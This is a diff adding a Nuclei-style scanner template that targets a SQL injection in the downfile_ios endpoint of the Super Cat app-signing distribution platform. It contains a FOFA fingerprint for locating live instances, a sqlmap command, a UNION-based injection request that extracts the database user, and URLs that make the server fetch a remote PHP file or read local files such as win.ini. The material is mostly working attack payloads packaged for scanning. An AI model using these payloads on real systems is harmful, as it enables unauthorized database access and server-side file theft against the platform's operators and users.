@@ -1,0 +1,29 @@
+id: supercat-sign-platform-downfile_ios-sql
+
+info:
+  name: "超级猫签名APP分发平台 downfile_ios接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa:"/themes/97013266/public/static/css/pc.css"
+          该平台为安卓及iOS应用提供签名分发服务，支持开发者对其应用进行签名部署，并集成登录注册功能及SDK组件
+          通过构造恶意参数触发SQL注入：sqlmap.py -u "http://127.0.0.1:81/user/install/downfile_ios?id=*" --level=3 --dbms=mysql
+      /user/profile/download?url=http://云服务器地址/111.php&path=1
+      /user/profile/download?url=file:///C:/windows/win.ini&path=1
+      /user/profile/filesd?file=1&url=file:///C:/windows/win.ini
+  tags: 超级猫签名APP分发平台
+
+http:
+- raw:
+  - |
+    GET /user/install/downfile_ios?id=') UNION ALL SELECT NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflateConnection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'addtime'
